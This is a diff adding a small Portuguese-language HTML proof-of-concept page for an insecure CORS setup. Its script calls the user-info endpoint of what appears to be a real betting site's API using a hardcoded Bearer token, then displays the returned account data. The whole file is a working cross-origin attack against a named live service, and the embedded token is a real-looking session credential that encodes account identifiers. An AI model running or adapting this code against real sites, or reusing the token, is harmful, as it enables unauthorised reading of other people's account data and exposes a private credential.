@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8" />
+<title>PoC CORS Inseguro com Bearer Token</title>
+</head>
+<body>
+<h2>Teste CORS Inseguro - Chamada Autenticada</h2>
+<pre id="resultado">Carregando...</pre>
+
+<script>
+  fetch("https://api.w1-boxingpg.bet/api/member/member/UserInfo", {
+    method: "GET",
+    headers: {
+      "accept": "*/*",
+      "content-type": "application/json",
+      "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1laWQiOiIyMTAzNzciLCJhcmVhSWQiOiI2MCIsInN5c1JvbGUiOiI2MCIsImxlYXNlIjoiMCIsImxlYXNlTWdyIjoiMSIsIm1lbWJlck5vIjoiNTE1NzAwIiwiZ3JhZGVJZCI6Ijc1OCIsImFnZW50SWQiOiI0MzYiLCJuYW1lIjoiMzE5ODg0MjMxMjEiLCJyb2xlIjoiMCIsImNsaWVudElkIjoiOTIyOTk3NzgtMTQ1NS00MWI1LWE5OTEtYzRjOGU5NGNkYzUxIiwiY2xpZW50VHlwZSI6IkJyb3dzZXIiLCJuYmYiOjE3NTUwMDk5OTcsImV4cCI6MTc1NTA5NjM5NywiaWF0IjoxNzU1MDA5OTk3LCJpc3MiOiJraW5nNzc3NyIsImF1ZCI6Imtpbmc3Nzc3IGFwaSBjbGllbnQifQ.4ngSE4dj3Uo7hHKAYlfzfXYf8DVCkMJz3vJAW34FaGo"
+    },
+    credentials: "include"  // se precisar enviar cookies, pode manter, senão pode tirar
+  })
+  .then(response => {
+    if (!response.ok) throw new Error('Status HTTP ' + response.status);
+    return response.text();
+  })
+  .then(data => {
+    document.getElementById("resultado").textContent = data;
+    console.log("Dados recebidos:", data);
+  })
+  .catch(error => {
+    document.getElementById("resultado").textContent = "Erro: " + error;
+    console.error("Erro:", error);
+  });
+</script>
+
+</body>
+</html>
